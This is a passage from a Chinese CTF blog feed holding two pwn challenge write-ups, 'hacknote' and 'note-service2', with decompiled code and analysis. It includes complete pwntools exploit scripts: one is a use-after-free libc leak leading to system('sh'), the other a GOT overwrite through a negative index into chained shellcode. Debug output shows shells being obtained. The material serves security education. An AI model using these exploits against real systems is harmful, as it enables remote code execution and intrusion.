punctuation">)</span><span class="token punctuation">:</span>  sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>  sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>  sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>  sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',51996)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#libc = ELF('libc_32.so.6')</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token string">'BBBB'</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x0804862B</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>bin_sh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'||sh'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>然而最后add(8,p32(system_addr)+’||sh’)而不是add(8,p32(system_addr)+p32(bin_sh_addr))，我们回到self_puts函数和show函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span><span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> note_cont <span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span> note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token operator">*</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//在add函数中第一个chunk的第一个字段就存放了self_puts函数的地址，</span>                                  <span class="token comment" spellcheck="true">//结合self_puts函数分析可知这里是利用函数指针进行函数调用</span><span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> __cdecl <span class="token function">self_puts</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//注意这个+4之后再整体解引用</span><span class="token punctuation">}</span></code></pre><p>第一次我们是self_puts放在chunk_data的第一字段，got放在第二字段这样会执行self_puts函数，而self_puts函数会对其传入的参数+4再解引用，就是第二字段，因此我们成功泄露地址<br>但第二次我们是将system真实地址放入第一字段，第二字段即参数是note_ptr[v1]而这里放的是第一个chunk_data,所以如果我们add(8,p32(system_addr)+p32(bin_sh_addr)) 对应就是  (*system_addr)(system_addr+bin_sh_addr)<br>这里放的是”||sh”====&gt;(*system_addr)(system_addr+”||sh”)这样||前面的地址system无法作为参数，就会采用后面的sh作为参数</p></li></ul><p>结果：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x17</span> bytes<span class="token operator">:</span>    <span class="token number">00000000</span>  <span class="token number">73</span> <span class="token number">68</span> 3a <span class="token number">20</span>  <span class="token number">31</span> 3a <span class="token number">20</span> <span class="token number">10</span>  <span class="token number">8d</span> d5 f7 3a  <span class="token number">20</span> 6e <span class="token number">6f</span> <span class="token number">74</span>  │sh<span class="token operator">:</span> │<span class="token number">1</span><span class="token operator">:</span> ·│···<span class="token operator">:</span>│ not│    <span class="token number">00000010</span>  <span class="token number">20</span> <span class="token number">66</span> <span class="token number">6f</span> <span class="token number">75</span>  6e <span class="token number">64</span> 0a                               │ fou│nd·│    <span class="token number">00000017</span>sh<span class="token operator">:</span> <span class="token number">1</span><span class="token operator">:</span> \x10��<span class="token operator">:</span> not found$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><strong>堆利用对指针理解要求较高，所以一定要分析清楚数据结构，还有关键函数（显示信息，更改信息的函数等）对指针的使用</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-CHALLENGE-note-service2</title>
      <link href="/2020/09/11/xctf-challenge-note-service2/"/>
      <url>/2020/09/11/xctf-challenge-note-service2/</url>
      
        <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ checksec note<span class="token operator">-</span>service2<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/note-service2'</span>    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    Canary found    NX<span class="token operator">:</span>       NX disabled    PIE<span class="token operator">:</span>      PIE enabled    RWX<span class="token operator">:</span>      Has RWX segments开启 PIE CANARY RWX</code></pre><h2 id="IDA–关键代码"><a href="#IDA–关键代码" class="headerlink" title="IDA–关键代码"></a>IDA–关键代码</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_CA5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  result <span class="token operator">=</span> dword_20209C<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_20209C <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>       <span class="token punctuation">{</span>    result <span class="token operator">=</span> dword_20209C<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_20209C <span class="token operator">&lt;=</span> <span class="token number">11</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v1 <span class="token operator">=</span> <span class="token function">sub_B91</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token function">sub_B91</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v2 <span class="token operator">=</span> result<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> result <span class="token operator">&lt;=</span> <span class="token number">8</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        qword_2020A0<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>qword_2020A0<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"malloc error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read_buf_n</span><span class="token punctuation">(</span>qword_2020A0<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>        result <span class="token operator">=</span> dword_20209C<span class="token operator">++</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span>del<span class="token punctuation">:</span>    <span class="token keyword">void</span> <span class="token function">sub_DE7</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST0C_4</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token function">sub_B91</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span>qword_2020A0<span class="token punctuation">[</span>v0<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>read_buf_n<span class="token punctuation">:</span>    <span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_AC3</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">char</span> a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-20h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+13h] [rbp-Dh]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+14h] [rbp-Ch]</span>  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v4 <span class="token operator">=</span> a3<span class="token punctuation">;</span>                                      <span class="token comment" spellcheck="true">// a1==addr</span>  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> a2 <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">></span> i<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">// a2==8</span>  <span class="token punctuation">{</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">==</span> v4 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token operator">*</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token operator">*</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v7<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><ul><li>在sub_CA5函数主要实现添加信息的功能，信息包括：index，size，content。其中index没有限制，size最大为8，content也有限制。<ul><li>通过程序自制的read_buf_n函数可知当size（a2）为最大值8，可以向buf（addr）中读入7个字节，并在最后添加截至符。</li></ul></li><li>程序将chunk的返回地址放入bss段中，构成bss段数组，数组的下标index没有限制</li><li>del函数部分实现对应chunk的free<br>一部分数据段：<pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202018</span> off_202018      dq offset free          <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _free↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202020</span> off_202020      dq offset puts          <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _puts↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202028</span> off_202028      dq offset __stack_chk_fail<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202028</span>                                         <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> ___stack_chk_fail↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202030</span> off_202030      dq offset printf        <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _printf↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202038</span> off_202038      dq offset memset        <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _memset↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202040</span> off_202040      dq offset read          <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _read↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202048</span> off_202048      dq offset __libc_start_main<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202048</span>                                         <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> ___libc_start_main↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202050</span> off_202050      dq offset malloc        <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _malloc↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202058</span> off_202058      dq offset setvbuf       <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _setvbuf↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202060</span> off_202060      dq offset atoi          <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _atoi↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202068</span> off_202068      dq offset exit          <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _exit↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202068</span> _got_plt        ends<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000002020A0 <span class="token punctuation">;</span> _QWORD qword_2020A0<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000002020A0 qword_2020A0    dq 0Ch <span class="token function">dup</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token punctuation">)</span>           <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> sub_BE0<span class="token operator">+</span><span class="token number">18</span>↑o<span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000002020A0                                         <span class="token punctuation">;</span> add<span class="token operator">+</span><span class="token number">92</span>↑o <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000002020A0 _bss            ends<span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000002020A0</code></pre></li></ul><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>题目没有开启NX那么代表堆栈可执行，应该是要向堆里面写入shellcode<ul><li>每个chunk只能读入7个字节，所以现成的shellcode不能用，但可以自己asm对应的system/execve汇编指令（就像构造rop链一样）</li></ul></li><li>因为bss段数组没有控制index范围，查询相关资料可知数组下标为负数就是对应buf[0]前面的元素，那我们就可以修改函数got表达到控制程序执行流<ul><li>上面的数据段可知bss数组与这些函数got表的距离很近，可以访问到</li></ul></li><li>我们的system/execve的代码分布在多个chunk中那么要在里面放入跳转指令：jmp short 偏移</li></ul><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>shellcode：execv(rdi=”/bin/sh”,rsi=0,rdx=0),rax=0x3b</p><pre class=" language-java"><code class="language-java">xor rax<span class="token punctuation">,</span>raxxor rsi<span class="token punctuation">,</span>rsixor rdx<span class="token punctuation">,</span>rdxmov eax<span class="token punctuation">,</span><span class="token number">0x3b</span>syscall这里如果直接mov rax<span class="token punctuation">,</span><span class="token number">0x3b</span> 这将会占用<span class="token number">7</span>字节</code></pre><p>至于rdi要存放/bin/sh，我们可以使用atoi_got表来解决这个问题：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000BBD                 mov     rdi<span class="token punctuation">,</span> rax        <span class="token punctuation">;</span> nptr<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000BC0                 mov     eax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000BC5                 call    _atoi这是执行atoi函数的代码</code></pre><p>我们如果输入choice时，输入/bin/sh那么rdi==/bin/sh然后call atoi就会转跳到atoi_got，又我们可以通过数组越界来控制其got表里面的内容，放入转跳指令，使程序流到chunk中 的shellcode。</p><p>因为每一个chunk只能输入7字节，所以才精心构造了上面的指令。xor指令占用3字节，mov指令占用5字节，剩下的空间来存放跳转。<br>这里跳转jmp short xxx的机器码是 EB xxx（占两个字节）   看了大佬的博客偏移量xxx = 目标地址-当前地址-2。</p><p>那我们将要malloc 5次（每个chunk都是0x20的总大小） ，其分布为：<br><img src="https://s1.ax1x.com/2020/09/11/wtYL4S.png" alt=""></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>cont<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice>>'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">,</span>size<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span>cont<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice>>'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./note-service2'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#帮atoi_got占着第一个chunk</span>add<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">'xor rax,rax'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x90\x90\xeb\x19'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">'xor rsi,rsi'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x90\x90\xeb\x19'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">'xor rdx,rdx'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x90\x90\xeb\x19'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">'mov eax,0x3b'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\xeb\x19'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">'syscall'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x90\x90\x90\x90\x90'</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#释放，再malloc那么atoi_got就会被放在第一个chunk</span>add<span class="token punctuation">(</span><span class="token string">'-8'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span><span class="token string">'\x90\x90\x90\x90\x90\xeb\x19'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#pause()</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>这里我们要让每次接受content的字节数都为7，因为题目自制的read函数最多读入7个字节 然后我们就可以用sendafter函数输入字节数恰好为7的content，就不用输入\n（sendline），否则我们add(‘4’,’8’,asm(‘mov eax,0x3b’)+’\xeb\x19’）就会添上一个\n多余的字节，无法打通。主要是这个地方的原因，其他的都是有剩余空间的。</p><p>跳转机器码是：eb 0x19 =====&gt; jmp short xxx<br>计算过程：<br>xxx = 目标地址-当前地址-2<br><img src="https://s1.ax1x.com/2020/09/11/wtYqN8.png" alt=""></p><p>add过程：<br><img src="https://s1.ax1x.com/2020/09/11/wtYj3Q.png" alt=""></p><p>结果：</p><pre class=" language-java"><code class="language-java">your choice<span class="token operator">>></span> $ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token 